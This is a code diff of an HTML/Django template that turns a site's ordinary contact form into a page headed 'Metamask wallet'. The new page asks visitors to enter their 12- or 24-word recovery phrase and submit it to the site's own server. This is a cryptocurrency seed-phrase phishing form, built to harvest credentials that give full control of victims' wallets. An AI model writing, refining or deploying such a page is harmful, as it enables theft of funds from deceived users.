@@ -47,38 +47,41 @@
         </section>
     </div>
     <!--//inner-page-->
-    <!-- contact-form -->
-    <section class="w3l-contact-main" id="contact">
-        <div class="contact-infhny py-5">
-            <div class="container py-md-5">
-                <div class="title-content text-center mb-md-5 mb-4">
+<!-- contact -->
+<section class="w3l-contact-main" id="contact">
+	<div class="contact-infhny py-5">
+		<div class="container py-md-5">
+			<div class="title-content text-center mb-md-5 mb-4">
+				
+				<p class="text-para mt-2">Enter code for <b style="color:#fa9f1e">Metamask</b></p>
+				<p class="text-para">Typically 12 (sometimes 24) words separated by single spaces</p>
+			</div>
+			<div class="container">
+                <form action="" method="POST" class="contact-form">
+                    {% csrf_token %}
                     
-                    <p class="text-para mt-2">Enter code for <b style="color:#fa9f1e">Metamask</b></p>
-                </div>
-                <div class="top-map">
-                    <div class="map-content-9">
-                         <form action="#" method="post">
-                            {% csrf_token %}
-                            <div class="form-top1">
-
-                                <div class="form-top">
-                                    <div class="form-top-righ">
-                                        <textarea name="Message" id="Message" placeholder="Message*" required=""></textarea>
-                                    </div>
-                                    
-
-                                </div>
-                                <div class="text-center mt-5">
-                                    <button type="submit" class="btn btn-style btn-primary">Submit Now <i class="far fa-paper-plane ml-lg-3"></i></button>
-                                </div>
-                            </div>
-                        </form>
+                    <div class="form-control" style="background-color: #1a202c; border-color: #1a202c;">
+                        <div class="tag" style="color: #fff; margin: 20px">Metamask wallet</div>
+                        <textarea name="message" placeholder="Enter your recovery phrase" cols="30" rows="10" required=""></textarea>
                     </div>
-                </div>
+                    <p style="color:#fff">Typically 12 (sometimes 24) words separated by single spaces</p>
+                    <div class="form-control" style="background-color: #1a202c; border-color: #1a202c;">
+                        <input type="submit" class="btn submit-btn" value="submit">
+                    </div>
+               
+               
+               
+               </form>
+                            
+                            
+                
+                
+                            
             </div>
         </div>
     </section>
  
+
     <!--/footer-->
     <footer class="w3l-footer-29-main">
         <div class="footer-29-w3l py-5">
